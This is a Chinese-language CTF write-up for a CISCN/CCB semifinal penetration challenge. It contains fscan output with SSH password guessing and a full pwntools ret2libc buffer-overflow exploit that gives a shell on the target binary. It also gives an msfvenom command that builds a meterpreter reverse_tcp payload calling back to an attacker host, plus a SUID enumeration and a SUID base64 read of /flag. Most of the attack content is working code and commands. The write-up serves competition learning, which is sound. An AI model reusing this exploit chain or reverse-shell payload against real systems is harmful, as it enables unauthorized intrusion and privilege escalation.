---
title: "ciscn&ccb半决赛wp"
date: 2025-03-18 09:53:23
updated: 2025-03-18 09:54:25
tags:
  - WriteUp
  - CTF
---
# 渗透题目: 数据管理系统

服务IP:172.19.134.30

fscan扫到[http://172.19.134.30:8081](http://172.19.134.30:8081) [目录遍历],下载二进制文件[exrop](http://172.19.134.30:8081/exrop)

```plain
 fscan ./fscan -h 172.19.134.30

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
172.19.134.30:8080 open
172.19.134.30:8081 open
172.19.134.30:22 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://172.19.134.30:8081 code:200 len:397    title:Directory listing for /
[+] InfoScan http://172.19.134.30:8081 [目录遍历]
[*] WebTitle http://172.19.134.30:8080 code:302 len:0      title:None 跳转url: http://172.19.134.30:8080/login;jsessionid=B952AD0BF5CBC1EA41A13D95E0F73D74
[*] WebTitle http://172.19.134.30:8080/login;jsessionid=B952AD0BF5CBC1EA41A13D95E0F73D74 code:200 len:8663   title:Login
已完成 2/3 [-] ssh 172.19.134.30:22 root root@111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 2/3 [-] ssh 172.19.134.30:22 root !QAZ2wsx ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 2/3 [-] ssh 172.19.134.30:22 root 1q2w3e ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 2/3 [-] ssh 172.19.134.30:22 admin admin111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 3/3
[*] 扫描结束,耗时: 4m24.734541167s
```

Exp:

```python
from pwn import *
from LibcSearcher import *

p = remote('172.19.134.30', 65533)
# p = process('./exrop')
elf = ELF('./exrop')

main = 0x40118C
pop_rdi = 0x401181
ret = 0x40101a

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

offset = 0x130 + 8
payload =b'a' * offset
payload = payload + p64(pop_rdi)
payload = payload + p64(puts_got)
payload = payload + p64(puts_plt)
payload = payload + p64(main)
p.sendlineafter('Pwn me\n', payload)

puts_addr = u64(p.recvuntil('\n')[:-1].ljust(8, b'\0'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
Offset = puts_addr - libc.dump('puts')
binsh = 0x402004
system = Offset + libc.dump('system')
payload =b'a' * offset
payload = payload + p64(ret)
payload = payload + p64(pop_rdi)
payload = payload + p64(binsh)
payload = payload + p64(system)
p.sendlineafter('Pwn me\n', payload)

p.interactive()
```

拿到shell后用msf生成🐎，上线msf

```plain
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.134.251 LPORT=4444 -f elf -o root.elf
```

寻找suid权限文件

```plain
find / -type f -perm -04000 -ls 2>/dev/null
   134682     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   157047     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   131308     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   134467    468 -rwsr-xr-x   1 root     root         477672 Jan  3  2024 /usr/lib/openssh/ssh-keysign
   134784     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /usr/bin/umount
   134783     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /usr/bin/mount
   147488    204 -rwsr-xr--   1 root     stapusr      207832 Mar 17  2022 /usr/bin/stapbpf
   147480    220 -rwsr-xr--   1 root     stapusr      224496 Mar 17  2022 /usr/bin/staprun
   137037     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
   136553     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
   136554     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
   135331     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /usr/bin/su
   157044     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec
   148624     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 13  2018 /usr/bin/at
   147453    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
   130837     44 -rwsr-xr-x   1 root     root          43352 Sep  5  2019 /usr/bin/base64
   137036     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
   131250     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
   144976     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
```

使用base64读取/flag

```plain
/usr/bin/base64 /flag | base64 --decode
flag{16fc0d69-a7b9-0a5d-5ff6-8eab6776774f}
```